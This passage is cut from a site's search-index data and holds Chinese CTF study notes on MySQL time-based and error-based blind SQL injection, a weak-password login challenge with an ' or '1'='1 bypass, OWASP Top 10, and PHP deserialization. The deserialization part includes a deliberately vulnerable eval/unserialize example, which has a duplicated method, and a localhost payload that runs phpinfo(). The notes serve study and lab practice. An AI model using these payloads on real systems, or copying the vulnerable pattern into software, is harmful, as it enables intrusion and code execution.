0)时，sin(0)=0，此时按照余切函数的定义式 $$ \\cot(0)=\\frac{\\cos(0)}{\\sin(0)} $$ 由于分母sin(0) = 0，而在数学运算里，除数是不能为0的，因为这样的除法运算没有意义，所以cot(0)是没有定义的，不能进行这样的运算。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第29天\n\n\n\n * 适用场景：\n   * if方法延时盲注\n   * case方法延时忙注\n   * 延时的基本方法\n   * 其他方法\n * 报错盲注\n   * 一般形式\n   * 举例引入问题：\n   * exp()函数：\n   * cot()三角函数\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第13章：延时盲注\n\n> 延时盲注考的不太多\n> \n> 大概算了一下，这个视频系列有100集，如果按照每天1集的速度，学完至少要三个月，太慢了，需要加快速度了。\n\n\n# 适用场景：\n\n如果现在不给返回布尔型的状态了，比如“登录成功”、“登录失败”。现在都返回的是查询成功，这种情况下用延时盲注\n\n\n# if方法延时盲注\n\nmysql> select if(1=1,1,0);\n+-------------+\n| if(1=1,1,0) |\n+-------------+\n|           1 |\n+-------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nmysql>  select if(1=1,sleep(5),0);\n+--------------------+\n| if(1=1,sleep(5),0) |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (5.01 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n一般形式：if(exp1,exp2,exp3)\n\n意思是，如果表达式1成立，就返回表达式2，否则就返回表达式3。\n\n\n# case方法延时忙注\n\nmysql> select case 'a' when 'a' then 1 else 0 end;\n+-------------------------------------+\n| case 'a' when 'a' then 1 else 0 end |\n+-------------------------------------+\n|                                   1 |\n+-------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select case when 'a'='a' then 1 else 0 end;\n+-------------------------------------+\n| case when 'a'='a' then 1 else 0 end |\n+-------------------------------------+\n|                                   1 |\n+-------------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n一般形式：case exp1 when exp2\n\ncase when then 有两种写法\n\n * 一种是案例1的case一个字符，when一个字符\n * 一种是案例2的case什么也不加，when一个表达式\n\n\n# 延时的基本方法\n\n用sleep()函数，括号里单位是秒\n\n我们只需要构造case或者if条件表达式，然后满足条件就让他延时，看网页加载的长短就能观察出延时成功了还是没成功，进而可以判断出条件表达式的真假，通过表达式的真假就可以把数据给注入出来（简直天才的想法）\n\n\n# 其他方法\n\n如果过滤了sleep()同时又没有回显，只能延时注入，该怎么办？\n\nps：mysql中只有sleep这一个延时函数。\n\n解决方案：\n\n 1. benchmark()：这个函数可以测试某些特定操作的执行速度，参数可以是需要执行的次数和表达式，表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数，该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，md5()函数要比sha1()函数要快。\n    \n    mysql> select benchmark(1000000,md5('flag'));\n    +--------------------------------+\n    | benchmark(1000000,md5('flag')) |\n    +--------------------------------+\n    |                              0 |\n    +--------------------------------+\n    1 row in set (0.13 sec)\n    \n    mysql> select benchmark(1000000,sha1('flag'));\n    +---------------------------------+\n    | benchmark(1000000,sha1('flag')) |\n    +---------------------------------+\n    |                               0 |\n    +---------------------------------+\n    1 row in set (0.48 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. **笛卡尔积：**主要用count()函数，一般是用count(*)或者count(1)，又或者count(列名)。根据列是不是主键而会影响到性能。\n    \n    mysql> select count(*) from account;\n    +----------+\n    | count(*) |\n    +----------+\n    |        1 |\n    +----------+\n    1 row in set (0.02 sec)\n    \n    mysql> select * from account;\n    +-----+-------+---------+\n    | aid | name  | balance |\n    +-----+-------+---------+\n    |   1 | admin |       1 |\n    +-----+-------+---------+\n    1 row in set (0.00 sec)\n    \n    mysql> select count(*) from account a,account b;\n    +----------+\n    | count(*) |\n    +----------+\n    |        1 |\n    +----------+\n    1 row in set (0.00 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    \n\n 3. get_lock：这是一种比较神奇的利用技巧，延时是精确可控的，但问题在于并不是所有的站都适用\n    \n    mysql> select get_lock('flag',1);\n    +--------------------+\n    | get_lock('flag',1) |\n    +--------------------+\n    |                  1 |\n    +--------------------+\n    1 row in set (0.00 sec)\n    \n    # 此时我们重新开个窗口，需要换个session\n    mysql> select get_lock('flag',5);\n    +--------------------+\n    | get_lock('flag',5) |\n    +--------------------+\n    |                  1 |\n    +--------------------+\n    1 row in set (5.02 sec)\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n    \n    在一个session中可以先锁定一个变量，然后通过另一个session再次执行get_lock函数，此时会产生5秒的延迟，其效果类似于sleep(5)，当然之后可以用rerelease_lock()函数释放\n\n 4. **正则表达式：**正则表达式在匹配较长的字符串但自由度比较高的字符串时，会造成较大的计算量，我们通过rpad或者repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。\n    \n    mysql> select rpad('a',4999999,'a') rlike concat(repeat('(a.*)+',30),'b');\n    +-------------------------------------------------------------+\n    | rpad('a',4999999,'a') rlike concat(repeat('(a.*)+',30),'b') |\n    +-------------------------------------------------------------+\n    |                                                        null |\n    +-------------------------------------------------------------+\n    1 row in set, 1 warning (0.00 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n以上延时都考的挺少的。\n\n\n# 第14章：报错盲注\n\n\n# 报错盲注\n\n\n# 一般形式\n\nif error , return err\n\nelse return ok!\n\n\n# 举例引入问题：\n\nif((substr='a'), 执行某个函数执行过程中报错, 0)\n\n\n1\n\n\n这个函数执行过程中报错，可不是随便自己起一个乱七八糟的函数名就可以的，这样只会在select一执行就报错。\n\n我们可以使用两种函数：exp()和cot()\n\n\n# exp()函数：\n\n作用：会返回自然对数，也就是e的多少次方。\n\nmysql>  select if(1=1,sleep(5),0);\n+--------------------+\n| if(1=1,sleep(5),0) |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (5.01 sec)\n\nmysql> select exp(1);\n+-------------------+\n| exp(1)            |\n+-------------------+\n| 2.718281828459045 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(5);\n+-------------------+\n| exp(5)            |\n+-------------------+\n| 148.4131591025766 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(500);\n+------------------------+\n| exp(500)               |\n+------------------------+\n| 1.4035922178528375e217 |\n+------------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(5000);\nerror 1690 (22003): double value is out of range in 'exp(5000)'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n我们有了以上exp函数，我们可以试一下if里边用exp\n\nmysql> select if((1=1),exp(5000),0);\nerror 1690 (22003): double value is out of range in 'exp(5000)'\nmysql> select if((1=2),exp(5000),0);\n+-----------------------+\n| if((1=2),exp(5000),0) |\n+-----------------------+\n|                     0 |\n+-----------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# cot()三角函数\n\n这个可以直接用select cot(0)\n\nmysql> select cot(0);\nerror 1690 (22003): double value is out of range in 'cot(0)'\n\n\n1\n2\n\n\n> 余切函数(\\cot(x))的表达式为： $$ [ \\cot(x)=\\frac{\\cos(x)}{\\sin(x)} ] $$ 当(x = 0)时，sin(0)=0，此时按照余切函数的定义式 $$ \\cot(0)=\\frac{\\cos(0)}{\\sin(0)} $$ 由于分母sin(0) = 0，而在数学运算里，除数是不能为0的，因为这样的除法运算没有意义，所以cot(0)是没有定义的，不能进行这样的运算。",charsets:{cjk:!0},lastUpdated:"2024/12/15, 20:52:37",lastUpdatedTimestamp:1734267157e3},{title:"20241216CTF学习笔记13",frontmatter:{title:"20241216CTF学习笔记13",date:"2024-12-16T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-16-CTFLearn.html",relativePath:"views/numerology/2024-12-16-CTFLearn.md",key:"v-422c6a84",path:"/views/numerology/2024-12-16-CTFLearn.html",headers:[{level:2,title:"1.EzLogin",slug:"_1-ezlogin",normalizedTitle:"1.ezlogin",charIndex:43}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第30天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"1.EzLogin",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第30天\n\n\n\n * 1.EzLogin\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第15章：Web进阶题-1-弱口令爆破\n\n\n# 1.EzLogin\n\n * 题目地址：\n * 解题思路\n   1. 根据提示，发现登录用户名为admin\n   2. 查看网页源代码，发现该题目是弱口令爆破\n   3. 使用BurpSuite爆破，得到密码为administrator\n\n进入页面，发现是一个输入用户名和密码的文本框，还有一个登录的按钮\n\n\n\n根据题目提示，我们要进行登录，首先尝试输入后，发现返回时提示用户名是admin，我们用admin登录，密码尝试一些简单的弱口令，发现返回密码错误。\n\n要养成查看网页源代码的习惯，常用的查看源代码的方式我附到最后。\n\n\n\n两个等于号结尾或者一个等于号结尾，这个非常有可能是Base64编码，我们用工具给它解码\n\n\n\n提示“I have no sql”，意思是这道题不是一个SQL注入的题，不能用SQL注入的万能密码去做。\n\n>  1. SQL 注入基本原理\n>     * SQL 注入是一种恶意攻击技术，攻击者通过在用户输入或其他数据源中注入恶意的 SQL 代码，利用程序对用户输入验证不足的漏洞，改变 SQL 语句的原意，从而达到非法访问、篡改数据或执行其他恶意操作的目的。\n>  2. 所谓的 “万能密码”\n>     * 在简单的基于 SQL 验证的登录场景中，常见的一种 “万能密码” 形式是利用 SQL 语句的语法特点。例如，对于一个简单的用户验证查询语句SELECT * FROM users WHERE username = '$username' AND password = '$password';（这是一个简化的示例，假设是在 PHP 和 MySQL 环境中）。\n>     * 如果攻击者在用户名输入框输入' or '1'='1，密码随便输入（假设为123），那么实际执行的 SQL 语句就会变成SELECT * FROM users WHERE username = '' or '1'='1' AND password = '123';。在这里，' or '1'='1这个输入使得username条件部分恒为真（因为'1'='1'是恒成立的），只要密码部分的语法正确（在这里是password = '123'），就可以绕过正常的用户名和密码验证，成功登录系统。\n>     * 不过，这种 “万能密码” 只是在存在 SQL 注入漏洞且验证逻辑简单的情况下有效。\n>  3. 防范措施导致 “万能密码” 失效\n>     * 现代的 Web 应用程序开发通常会采取多种防范措施来防止 SQL 注入。例如，使用参数化查询（在不同的编程语言和数据库环境中有相应的实现方式，如在 Java 中使用PreparedStatement）。通过参数化查询，用户输入会被当作参数处理，而不是直接拼接在 SQL 语句中，这样就可以有效防止 SQL 注入攻击，使得上述所谓的 “万能密码” 无法发挥作用。\n>     * 另外，对用户输入进行严格的验证和过滤也是很重要的措施。例如，检查输入是否包含 SQL 关键字、特殊符号等，并且限制输入的长度和格式，从而降低 SQL 注入的风险。\n\n我们看下一段提示，是“7765616B”，这看起来像是16进制的编码，我们尝试解码得到\n\n\n\n这里解码得到weak，我们尝试用weak尝试登录，发现还是wrong password，所以应该是弱口令的意思。\n\n我们尝试用BurpSuite进行爆破，基本方法参照CTF攻防世界入门题单WriteUP-adworld-09",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第30天\n\n\n\n * 1.ezlogin\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第15章：web进阶题-1-弱口令爆破\n\n\n# 1.ezlogin\n\n * 题目地址：\n * 解题思路\n   1. 根据提示，发现登录用户名为admin\n   2. 查看网页源代码，发现该题目是弱口令爆破\n   3. 使用burpsuite爆破，得到密码为administrator\n\n进入页面，发现是一个输入用户名和密码的文本框，还有一个登录的按钮\n\n\n\n根据题目提示，我们要进行登录，首先尝试输入后，发现返回时提示用户名是admin，我们用admin登录，密码尝试一些简单的弱口令，发现返回密码错误。\n\n要养成查看网页源代码的习惯，常用的查看源代码的方式我附到最后。\n\n\n\n两个等于号结尾或者一个等于号结尾，这个非常有可能是base64编码，我们用工具给它解码\n\n\n\n提示“i have no sql”，意思是这道题不是一个sql注入的题，不能用sql注入的万能密码去做。\n\n>  1. sql 注入基本原理\n>     * sql 注入是一种恶意攻击技术，攻击者通过在用户输入或其他数据源中注入恶意的 sql 代码，利用程序对用户输入验证不足的漏洞，改变 sql 语句的原意，从而达到非法访问、篡改数据或执行其他恶意操作的目的。\n>  2. 所谓的 “万能密码”\n>     * 在简单的基于 sql 验证的登录场景中，常见的一种 “万能密码” 形式是利用 sql 语句的语法特点。例如，对于一个简单的用户验证查询语句select * from users where username = '$username' and password = '$password';（这是一个简化的示例，假设是在 php 和 mysql 环境中）。\n>     * 如果攻击者在用户名输入框输入' or '1'='1，密码随便输入（假设为123），那么实际执行的 sql 语句就会变成select * from users where username = '' or '1'='1' and password = '123';。在这里，' or '1'='1这个输入使得username条件部分恒为真（因为'1'='1'是恒成立的），只要密码部分的语法正确（在这里是password = '123'），就可以绕过正常的用户名和密码验证，成功登录系统。\n>     * 不过，这种 “万能密码” 只是在存在 sql 注入漏洞且验证逻辑简单的情况下有效。\n>  3. 防范措施导致 “万能密码” 失效\n>     * 现代的 web 应用程序开发通常会采取多种防范措施来防止 sql 注入。例如，使用参数化查询（在不同的编程语言和数据库环境中有相应的实现方式，如在 java 中使用preparedstatement）。通过参数化查询，用户输入会被当作参数处理，而不是直接拼接在 sql 语句中，这样就可以有效防止 sql 注入攻击，使得上述所谓的 “万能密码” 无法发挥作用。\n>     * 另外，对用户输入进行严格的验证和过滤也是很重要的措施。例如，检查输入是否包含 sql 关键字、特殊符号等，并且限制输入的长度和格式，从而降低 sql 注入的风险。\n\n我们看下一段提示，是“7765616b”，这看起来像是16进制的编码，我们尝试解码得到\n\n\n\n这里解码得到weak，我们尝试用weak尝试登录，发现还是wrong password，所以应该是弱口令的意思。\n\n我们尝试用burpsuite进行爆破，基本方法参照ctf攻防世界入门题单writeup-adworld-09",charsets:{cjk:!0},lastUpdated:"2024/12/16, 21:24:44",lastUpdatedTimestamp:1734355484e3},{title:"20241218CTF学习笔记14",frontmatter:{title:"20241218CTF学习笔记14",date:"2024-12-18T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-18-CTFLearn.html",relativePath:"views/numerology/2024-12-18-CTFLearn.md",key:"v-488be988",path:"/views/numerology/2024-12-18-CTFLearn.html",headers:[{level:2,title:"1.反序列化",slug:"_1-反序列化",normalizedTitle:"1.反序列化",charIndex:43},{level:3,title:"序列化和反序列化基础概念",slug:"序列化和反序列化基础概念",normalizedTitle:"序列化和反序列化基础概念",charIndex:55},{level:3,title:"反序列化漏洞",slug:"反序列化漏洞",normalizedTitle:"反序列化漏洞",charIndex:73}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第31天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"1.反序列化 序列化和反序列化基础概念 反序列化漏洞",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第31天\n\n\n\n * 1.反序列化\n   * 序列化和反序列化基础概念\n   * 反序列化漏洞\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第16章：初识反序列化\n\n\n# 1.反序列化\n\n10大最常出现的漏洞：owasp top 10\n\n>  1.  A01:2021 - 访问控制失效：从 2017 年版的第五位上升至首位，是最严重的 Web 应用程序安全风险之一。例如，用户能够访问未授权的页面或执行未授权的操作，平均有 3.81% 的受测应用程序存在此风险，与该风险类别对应的 34 个常见弱点枚举（CWE）在应用程序中的出现次数比其他任何类别都多。\n>  2.  A02:2021 - 加密失效：由 2017 年版的敏感数据暴露更名而来，重点关注与加密相关的故障，如使用不安全的加密算法、密钥管理不当等，常导致敏感数据暴露或系统受损，在此次排名中上升至第 2 位 。\n>  3.  A03:2021 - 注入：在 2021 版中下滑至第 3 位，不过 94% 的应用程序都针对某种形式的注入进行了测试，与该类别对应的 33 个 CWE 在应用程序中的出现次数位居第二，且此版本中跨站脚本攻击也被纳入该类别。\n>  4.  A04:2021 - 不安全设计：作为 2021 年的新类别，重点关注与设计缺陷相关的风险。若想从根本上提高安全性，行业需要更多地使用威胁建模、安全设计模式和原则以及参考架构等。\n>  5.  A05:2021 - 安全配置错误：从 2017 年版的第 6 位上升至第 5 位，90% 的应用程序都针对某种形式的配置错误进行了测试。随着软件可配置性的提高，该类别风险上升，2017 年版中的 XML 外部实体（XXE）类别现也归为此类。\n>  6.  A06:2021 - 易受攻击和过时的组件：之前名为使用已知漏洞的组件，在社区调查中排名第 2，通过数据分析也足以进入前十，从 2017 年版的第 9 位上升至第 6 位，是一个较难测试和评估风险的已知问题，也是唯一没有将任何常见漏洞和暴露（CVE）映射到所包含 CWE 的类别，因此在评分时默认将其利用和影响权重设为 5.0。\n>  7.  A07:2021 - 识别和认证失败：之前为身份验证失效，从第 2 位下滑至第 7 位，现在包含了更多与识别失败相关的 CWE，虽排名有所下降，但仍是 Top 10 的重要组成部分，标准化框架的增加似乎对此有所帮助。\n>  8.  A08:2021 - 软件和数据完整性故障：2021 年新增类别，侧重于在未验证完整性的情况下，对软件更新、关键数据和 CI/CD 管道做出假设，与该类别中 10 个 CWE 对应的通用漏洞披露 / 通用漏洞评分系统（CVE/CVSS）数据影响权重较高，2017 年版的不安全反序列化现归为此大类。\n>  9.  A09:2021 - 安全日志记录和监控故障：由 2017 年版的不足的日志记录和监控扩展而来，从第 10 位上升至第 9 位，涵盖了更多类型的故障，虽难以测试且在 CVE/CVSS 数据中体现不足，但该类别故障会直接影响可见性、事件警报和取证。\n>  10. A10:2021 - 服务器端请求伪造：通过 Top 10 社区调查新增的类别，数据显示其发生率相对较低，但测试覆盖率、利用和影响潜力的评级均高于平均水平，这表明安全社区认为其重要，即便当前数据未充分体现。\n\n\n# 序列化和反序列化基础概念\n\n**序列化：**是将变量转换为可保存或传输的字符串的过程；实现函数是serialize()\n\n**反序列化：**把这个字符串再转化为原来的变量使用，就是序列化的逆过程，实现函数是unserialize()\n\n序列化数据格式：\n\n数据类型   序列化数据结构\n对象     O:length:class name:attribute\n       number:{attr1;vlaue1;attr2;value2;}\n字符串    s:length:value;\n整数     i:value;\n布尔     b:value;\n空值     N;\n浮点数    d:value;\n\n<?php\nclass Student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new Student;\nvar_dump($a);\n\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n我们需要做的是把变量转化为字符串，这一步叫序列化\n\n<?php\nclass Student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new Student;\nvar_dump($a);\necho serialize($a);\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n序列化以前：\n\n> object(Student)#1 (2) {\n  ["name"]=>\n  string(6) "marrio"\n  ["grade"]=>\n  int(90)\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n序列化以后：\n\nO:7:"Student":2:{s:4:"name";s:6:"marrio";s:5:"grade";i:90;}\n\n\n1\n\n\nO代表对象，7代表长度length，对象名Student，属性个数为2\n\n * 第一个属性的键是字符串，长度为4，名为name，值是长度为5的字符串，叫marrio\n * 第二个属性的键是字符串，长度为5，名为grade，值是整数类型，是90\n\n我们对序列化后的内容进行反序列化，就能回归到原来的状态\n\n<?php\nclass Student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new Student;\nvar_dump($a);\necho serialize($a);\n$b=unserialize(serialize($a));\necho "\\n";\nvar_dump($b);\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n为什么要做序列化和反序列化：\n\n序列化和反序列化结合起来，可以轻松地存储和传输数据，使程序更具维护性。\n\n就像网上买了一张桌子，淘宝卖家不会整张桌子，而是拆解成零件和说明书，根据说明书来组装。\n\n\n# 反序列化漏洞\n\n反序列化漏洞，也叫对象注入，就是当程序在进行反序列化时，会自动调用一些函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些💀恶意代码导函数中，从而导致反序列化漏洞。',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第31天\n\n\n\n * 1.反序列化\n   * 序列化和反序列化基础概念\n   * 反序列化漏洞\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第16章：初识反序列化\n\n\n# 1.反序列化\n\n10大最常出现的漏洞：owasp top 10\n\n>  1.  a01:2021 - 访问控制失效：从 2017 年版的第五位上升至首位，是最严重的 web 应用程序安全风险之一。例如，用户能够访问未授权的页面或执行未授权的操作，平均有 3.81% 的受测应用程序存在此风险，与该风险类别对应的 34 个常见弱点枚举（cwe）在应用程序中的出现次数比其他任何类别都多。\n>  2.  a02:2021 - 加密失效：由 2017 年版的敏感数据暴露更名而来，重点关注与加密相关的故障，如使用不安全的加密算法、密钥管理不当等，常导致敏感数据暴露或系统受损，在此次排名中上升至第 2 位 。\n>  3.  a03:2021 - 注入：在 2021 版中下滑至第 3 位，不过 94% 的应用程序都针对某种形式的注入进行了测试，与该类别对应的 33 个 cwe 在应用程序中的出现次数位居第二，且此版本中跨站脚本攻击也被纳入该类别。\n>  4.  a04:2021 - 不安全设计：作为 2021 年的新类别，重点关注与设计缺陷相关的风险。若想从根本上提高安全性，行业需要更多地使用威胁建模、安全设计模式和原则以及参考架构等。\n>  5.  a05:2021 - 安全配置错误：从 2017 年版的第 6 位上升至第 5 位，90% 的应用程序都针对某种形式的配置错误进行了测试。随着软件可配置性的提高，该类别风险上升，2017 年版中的 xml 外部实体（xxe）类别现也归为此类。\n>  6.  a06:2021 - 易受攻击和过时的组件：之前名为使用已知漏洞的组件，在社区调查中排名第 2，通过数据分析也足以进入前十，从 2017 年版的第 9 位上升至第 6 位，是一个较难测试和评估风险的已知问题，也是唯一没有将任何常见漏洞和暴露（cve）映射到所包含 cwe 的类别，因此在评分时默认将其利用和影响权重设为 5.0。\n>  7.  a07:2021 - 识别和认证失败：之前为身份验证失效，从第 2 位下滑至第 7 位，现在包含了更多与识别失败相关的 cwe，虽排名有所下降，但仍是 top 10 的重要组成部分，标准化框架的增加似乎对此有所帮助。\n>  8.  a08:2021 - 软件和数据完整性故障：2021 年新增类别，侧重于在未验证完整性的情况下，对软件更新、关键数据和 ci/cd 管道做出假设，与该类别中 10 个 cwe 对应的通用漏洞披露 / 通用漏洞评分系统（cve/cvss）数据影响权重较高，2017 年版的不安全反序列化现归为此大类。\n>  9.  a09:2021 - 安全日志记录和监控故障：由 2017 年版的不足的日志记录和监控扩展而来，从第 10 位上升至第 9 位，涵盖了更多类型的故障，虽难以测试且在 cve/cvss 数据中体现不足，但该类别故障会直接影响可见性、事件警报和取证。\n>  10. a10:2021 - 服务器端请求伪造：通过 top 10 社区调查新增的类别，数据显示其发生率相对较低，但测试覆盖率、利用和影响潜力的评级均高于平均水平，这表明安全社区认为其重要，即便当前数据未充分体现。\n\n\n# 序列化和反序列化基础概念\n\n**序列化：**是将变量转换为可保存或传输的字符串的过程；实现函数是serialize()\n\n**反序列化：**把这个字符串再转化为原来的变量使用，就是序列化的逆过程，实现函数是unserialize()\n\n序列化数据格式：\n\n数据类型   序列化数据结构\n对象     o:length:class name:attribute\n       number:{attr1;vlaue1;attr2;value2;}\n字符串    s:length:value;\n整数     i:value;\n布尔     b:value;\n空值     n;\n浮点数    d:value;\n\n<?php\nclass student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new student;\nvar_dump($a);\n\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n我们需要做的是把变量转化为字符串，这一步叫序列化\n\n<?php\nclass student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new student;\nvar_dump($a);\necho serialize($a);\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n序列化以前：\n\n> object(student)#1 (2) {\n  ["name"]=>\n  string(6) "marrio"\n  ["grade"]=>\n  int(90)\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n序列化以后：\n\no:7:"student":2:{s:4:"name";s:6:"marrio";s:5:"grade";i:90;}\n\n\n1\n\n\no代表对象，7代表长度length，对象名student，属性个数为2\n\n * 第一个属性的键是字符串，长度为4，名为name，值是长度为5的字符串，叫marrio\n * 第二个属性的键是字符串，长度为5，名为grade，值是整数类型，是90\n\n我们对序列化后的内容进行反序列化，就能回归到原来的状态\n\n<?php\nclass student{\n    public $name="marrio";\n    public $grade=90;\n}\n$a=new student;\nvar_dump($a);\necho serialize($a);\n$b=unserialize(serialize($a));\necho "\\n";\nvar_dump($b);\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n为什么要做序列化和反序列化：\n\n序列化和反序列化结合起来，可以轻松地存储和传输数据，使程序更具维护性。\n\n就像网上买了一张桌子，淘宝卖家不会整张桌子，而是拆解成零件和说明书，根据说明书来组装。\n\n\n# 反序列化漏洞\n\n反序列化漏洞，也叫对象注入，就是当程序在进行反序列化时，会自动调用一些函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些💀恶意代码导函数中，从而导致反序列化漏洞。',charsets:{cjk:!0},lastUpdated:"2024/12/19, 21:35:09",lastUpdatedTimestamp:1734615309e3},{title:"20241219CTF学习笔记15",frontmatter:{title:"20241219CTF学习笔记15",date:"2024-12-19T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-19-CTFLearn.html",relativePath:"views/numerology/2024-12-19-CTFLearn.md",key:"v-6888adec",path:"/views/numerology/2024-12-19-CTFLearn.html",headers:[{level:2,title:"例题讲解",slug:"例题讲解",normalizedTitle:"例题讲解",charIndex:43}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第32天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"例题讲解",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第32天\n\n\n\n * 例题讲解\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第17章：反序列化例题讲解\n\n\n# 例题讲解\n\n<?php\n# 显示文件内容\nshow_source(__FILE__);\n# 不报错\nerror_reporting(0);\nclass DEMO{\n\tpublic $func;\n    public $arg;\n    public function safe(){\n        echo $this->arg;\n    }\n    public function run(){\n        # 按php执行arg的值\n        eval($this->arg);\n    }\n    public function run(){\n        # this表示对象自己，func属性值给this，然后把总体给this\n        $this->{$this->func}();\n    }\n    public function __construct(){\n        $this->func = 'evil';\n    }   \n}\n# GET方式传一个参数a，反序列化传给obj\n$obj=unserialize($_GET['a']);\n# 执行obj\n$obj->run();\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n反序列化题目做题步骤：\n\n 1. 复制源代码到本地\n\n 2. 注释掉和属性无关的内容\n    \n    跟属性相关的只有\n    \n    public $func;\n    public $arg;\n    \n    \n    1\n    2\n    \n\n 3. 根据题目需要，给属性赋值\n    \n    应该会先执行$this->func，所以把func赋值成evil\n    \n    public $func=\"evil\";\n    public $arg=\"phpinfo();\";\n    \n    \n    1\n    2\n    \n\n 4. 生成序列化数据，通常要urlencode\n    \n    $d = new DEMO;\n    echo urlencode(serialize($d));\n    \n    \n    1\n    2\n    \n\n 5. 传递数据到服务器（攻击目标）\n    \n    使用HackBar传一个Get请求\n    \n    http://127.0.0.1:8080/unserialize/demo.php?a=O%3A4%3A%22DEMO%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A4%3A%22evil%22%3Bs%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D\n    \n    \n    1\n    \n    \n    这个请求下应该会执行phpinfo()，所以他应该也会执行其他命令，比如system('ls');''",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第32天\n\n\n\n * 例题讲解\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第17章：反序列化例题讲解\n\n\n# 例题讲解\n\n<?php\n# 显示文件内容\nshow_source(__file__);\n# 不报错\nerror_reporting(0);\nclass demo{\n\tpublic $func;\n    public $arg;\n    public function safe(){\n        echo $this->arg;\n    }\n    public function run(){\n        # 按php执行arg的值\n        eval($this->arg);\n    }\n    public function run(){\n        # this表示对象自己，func属性值给this，然后把总体给this\n        $this->{$this->func}();\n    }\n    public function __construct(){\n        $this->func = 'evil';\n    }   \n}\n# get方式传一个参数a，反序列化传给obj\n$obj=unserialize($_get['a']);\n# 